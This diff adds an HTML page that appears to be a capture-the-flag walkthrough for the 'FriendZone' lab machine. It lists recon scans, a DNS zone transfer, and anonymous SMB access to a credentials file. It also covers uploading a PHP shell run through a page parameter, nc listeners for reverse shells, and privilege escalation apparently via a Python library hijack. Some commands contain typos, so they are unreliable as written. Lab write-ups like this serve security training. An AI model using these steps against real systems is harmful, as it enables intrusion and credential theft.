@@ -1,0 +1,45 @@
+<html>
+    <head></head>
+    <div>
+        <h1>FriendZone WriteUP</h1>
+        <p>Steps are Reconnaissance, Enumeration, Privilege Escalation</p>
+        <br>
+        <ol><li>Reconnaissance: nmap -sC -sV -O -oA initial 10.10.10.123, nmap -sC -sV -O -p- -oA full 10.10.10.123, nmap -sU -O -p- -oA udp 10.10.10.123,</li>
+            <li>Enumeration:
+                <ul>gobuster dir -w </ul>
+                <ul>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u</ul>
+                <ul>10.10.10.123, gobuster dir -w</ul>
+                <ul>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u</ul>
+                <ul>10.10.10.123/wordpress, nslookup</ul>
+                <ul>server 10.10.10.123</ul>
+                <ul>10.10.10.123</ul>
+                <ul>zone transfer command: host -l <domain-name> <dns_server-address>, </ul>
+                <ul>host -l friendzone.red 10.10.10.123 > zonetransfer.txt,</ul>
+                <ul>host -l friendzoneportal.red 10.10.10.123 >> zonetransfer.txt</ul>
+                <ul>10.10.10.123 friendzone.red friendzoneportal.red </ul>
+                <ul>admin.friendzoneportal.red files.friendzoneportal.red </ul>
+                <ul>imports.friendzoneportal.red vpn.friendzoneportal.red </ul>
+                <ul>administrator1.friendzone.red hr.friendzone.red </ul>
+                <ul>uploads.friendzone.red</ul>
+                <ul>smbmap -H 10.10.10.123</ul>
+                <ul>smbmap -R -H 10.10.10.123</ul>
+                <ul>smbclient -L //10.10.10.123</ul>
+                <ul>smbclient //10.10.10.123/general -N</ul>
+                <ul>get creds.txt</ul>
+                <ul>cat creds.txt</ul>
+            </li>
+            <li>Gaining an Initial Foothold: ?image_id=a.jpg&pagename=timestamp, <br>
+                https://administrator1.friendzone.red/dashboard.php?image_id=random.jpg&pagename=1573957506,<br>
+                smbclient //10.10.10.123/Development -N, put test.php, nc -nlvp 1234, python -c ‘import pty; <br>
+                pty.spwan(“/bin/bash”)’, sty raw -echo, export TERM=xterm, cat home/friend/user.txt,</li>
+
+            <li>Privilege escalation: put LinEnum.sh, cd /etc/development/, chmod +x LinEnum.sh, <br>
+                cp LinEnum.sh /tmp/, cd /tmp/, chmod +x LinEnum.sh, ./LinEnum.sh, ls -la /opt/server_admin/, <br>
+                cat /opt/server_admin/reporter.py, locate os.py, cd /usr/lib/python2.7, ls -la | grep os.py, stty -a, <br>
+                stty rows 29 columns 113, nc -nlvp 123,</li>
+        </ol> 
+
+                
+        
+    </div>
+</html>
